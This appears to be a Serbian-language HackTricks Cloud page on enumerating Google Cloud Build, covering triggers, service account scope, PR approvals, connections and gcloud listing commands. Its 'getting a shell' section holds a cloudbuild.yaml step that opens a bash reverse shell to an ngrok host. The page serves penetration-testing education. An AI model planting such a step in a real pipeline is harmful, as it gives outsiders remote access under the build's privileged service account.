# GCP - Cloud Build Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Google Cloud Build je upravljana CI/CD platforma koja **automatski gradi softver** i procese objavljivanja, integriÅ¡uÄ‡i se sa **repozitorijumima izvornog koda** i podrÅ¾avajuÄ‡i Å¡irok spektar programskih jezika. **OmoguÄ‡ava programerima da automatski grade, testiraju i implementiraju kod** dok pruÅ¾a fleksibilnost za prilagoÄ‘avanje koraka izgradnje i radnih tokova.

Svaki Cloud Build Trigger je **povezan sa Cloud Repozitorijumom ili direktno povezan sa spoljnim repozitorijumom** (Github, Bitbucket i Gitlab).

{% hint style="success" %}
Nisam mogao da vidim nijedan naÄin da ukradem Github/Bitbucket token odavde ili iz Cloud Repozitorijuma jer kada se repo preuzme, pristupa mu se putem [https://source.cloud.google.com/](https://source.cloud.google.com/) URL-a i Github se ne pristupa od strane klijenta.
{% endhint %}

### Events

Cloud Build moÅ¾e biti pokrenut ako:

* **Push na granu**: Odredite granu
* **Push novog taga**: Odredite tag
* **Pull request**: Odredite granu koja prima PR
* **RuÄno pozivanje**
* **Pub/Sub poruka:** Odredite temu
* **Webhook dogaÄ‘aj**: IzloÅ¾iÄ‡e HTTPS URL i zahtev mora biti autentifikovan tajnom

### Execution

Postoje 3 opcije:

* Yaml/json **koji specificira komande** za izvrÅ¡avanje. ObiÄno: `/cloudbuild.yaml`
* Samo jedan koji moÅ¾e biti specificiran â€œinlineâ€ u web konzoli i u cli
* NajÄeÅ¡Ä‡a opcija
* Relevantno za neautentifikovani pristup
* **Dockerfile** za izgradnju
* **Buildpack** za izgradnju

### SA Permissions

**Servisni nalog ima `cloud-platform` opseg**, tako da moÅ¾e **koristiti sve privilegije.** Ako **nije specificiran SA** (kao kada se radi submit) biÄ‡e koriÅ¡Ä‡en **podrazumevani SA** `<proj-number>@cloudbuild.gserviceaccount.com`. 

Podrazumevano, nijedna dozvola nije data, ali je priliÄno lako dati neku:

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### Approvals

MoguÄ‡e je konfigurisati Cloud Build da **zahteva odobrenja za izvrÅ¡enja izgradnje** (onemoguÄ‡eno podrazumevano).

### PR Approvals

Kada je okidaÄ PR, jer **bilo ko moÅ¾e da izvrÅ¡i PR-ove na javnim repozitorijumima**, bilo bi veoma opasno samo **dozvoliti izvrÅ¡enje okidaÄa sa bilo kojim PR-om**. Stoga, podrazumevano, izvrÅ¡enje Ä‡e biti **automatsko samo za vlasnike i saradnike**, a da bi se izvrÅ¡io okidaÄ sa PR-ovima drugih korisnika, vlasnik ili saradnik mora komentarisati `/gcbrun`.

<figure><img src="../../../.gitbook/assets/image (339).png" alt="" width="563"><figcaption></figcaption></figure>

### Connections & Repositories

Konekcije se mogu kreirati preko:

* **GitHub:** PrikazaÄ‡e OAuth prompt koji traÅ¾i dozvole za **dobijanje Github tokena** koji Ä‡e biti saÄuvan unutar **Secret Manager-a.**
* **GitHub Enterprise:** TraÅ¾iÄ‡e da se instalira **GithubApp**. **Token za autentifikaciju** sa vaÅ¡eg GitHub Enterprise hosta biÄ‡e kreiran i saÄuvan u ovom projektu kao **Secret Manager** tajna.
* **GitLab / Enterprise:** Morate **obezbediti API pristupni token i Read API pristupni token** koji Ä‡e biti saÄuvan u **Secret Manager-u.**

Kada se konekcija generiÅ¡e, moÅ¾ete je koristiti za **povezivanje repozitorijuma kojima Github nalog ima pristup**.

Ova opcija je dostupna putem dugmeta:

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Napomena da su repozitorijumi povezani ovom metodom **samo dostupni u Trigerima koji koriste 2. generaciju.**
{% endhint %}

### Connect a Repository

Ovo nije isto kao **`konekcija`**. Ovo omoguÄ‡ava **razliÄite** naÄine za dobijanje **pristupa Github ili Bitbucket** repozitorijumu, ali **ne generiÅ¡e objekat konekcije, veÄ‡ generiÅ¡e objekat repozitorijuma (1. generacija).**

Ova opcija je dostupna putem dugmeta:

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Storage

Ponekad Cloud Build Ä‡e **generisati novu skladiÅ¡te za Äuvanje datoteka za okidaÄ**. Ovo se deÅ¡ava, na primer, u primeru koji GCP nudi sa:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Kreiran je Storage bucket pod nazivom [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) za Äuvanje `.tgz` datoteke sa datotekama koje Ä‡e se koristiti.

### Dobijanje shel-a
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
Instalirajte gcloud unutar cloud build:
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Enumeration

MoÅ¾ete pronaÄ‡i **osetljive informacije u konfiguracijama gradnje i logovima**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Eskalacija privilegija

{% content-ref url="../gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Neautentifikovani pristup

{% content-ref url="../gcp-unauthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../gcp-unauthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post eksploatacija

{% content-ref url="../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
